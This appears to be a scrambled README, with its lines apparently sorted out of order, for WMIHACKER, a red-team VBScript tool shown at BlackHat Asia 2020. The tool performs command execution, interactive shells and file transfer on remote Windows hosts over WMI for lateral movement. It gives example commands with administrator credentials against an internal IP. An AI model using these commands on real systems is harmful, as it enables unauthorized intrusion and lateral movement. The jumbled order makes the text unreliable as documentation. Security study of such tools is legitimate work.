
                              v0.6beta       By. Xiangshan@360RedTeam
          /cmd          single command mode
          GETRES?       Res Need Or Not, Use 1 Or 0
          command       the command to run on remote host
          host          hostname or IP address
        WMIHACKER.vbs  /cmd  host  user  pass  command GETRES?
        WMIHACKER.vbs  /download  host  user  pass  localpath remotepath
        WMIHACKER.vbs  /shell  host  user  pass
        WMIHACKER.vbs  /upload  host  user  pass  localpath remotepath
    \/  \/   |_|  |_|_____| |_|  |_/_/    \_\_____|_|\_\______|_|  \_\
   \  /\  /  | |  | |_| |_  | |  | |/ ____ \ |____| . \| |____| | \ \
  \ \/  \/ / | |\/| | | |   |  __  | / /\ \| |    |  < |  __| |  _  /
 \ \  /\  / /| \  / | | |   | |__| |  /  \ | |    | ' /| |__  | |__) |
## 404Starlink
## BlackHat Asia 2020 Arsenal
## How to use
## Star History
<img src="https://github.com/knownsec/404StarLink-Project/raw/master/logo.png" width="30%">
> Disclaimer: The technology involved in this project is only for security learning and  defense purposes, illegal use is prohibited!
C:\Users\administrator\Desktop>cscript //nologo WMIHACKER_0.6.vbs
File download: Download the remote host calc.exe to the local c:\calc.exe
File upload: copy the local calc.exe to the remote host c:\calc.exe
Main functions: 1. Command execution; 2. File upload; 3. File download
No results are displayed after the command is executed
The result is displayed after the command is executed
Usage:
WMIHACKER has joined [404Starlink](https://github.com/knownsec/404StarLink)
[![Star History Chart](https://api.star-history.com/svg?repos=rootclay/WMIHACKER&type=Date)](https://star-history.com/#rootclay/WMIHACKER&Date)
[https://www.blackhat.com/asia-20/arsenal/schedule/#wmihacker-a-new-way-to-use-135-port-lateral-movement-bypass-av-and-transfer-file-18995](https://www.blackhat.com/asia-20/arsenal/schedule/#wmihacker-a-new-way-to-use-135-port-lateral-movement-bypass-av-and-transfer-file-18995)
\ \        / /  \/  |_   _| | |  | |   /\   / ____| |/ /  ____|  __ \
__          ____  __ _____   _    _          _____ _  ________ _____
`> cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo > c:\1.txt" 0`
`> cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo" 1`
`> cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator "Password!" `
`> cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator "Password!" "c:\calc" "c:\windows\system32\calc.exe" `
`> cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator "Password!" "c:\windows\system32\calc.exe" "c:\calc"`
```
shell mode
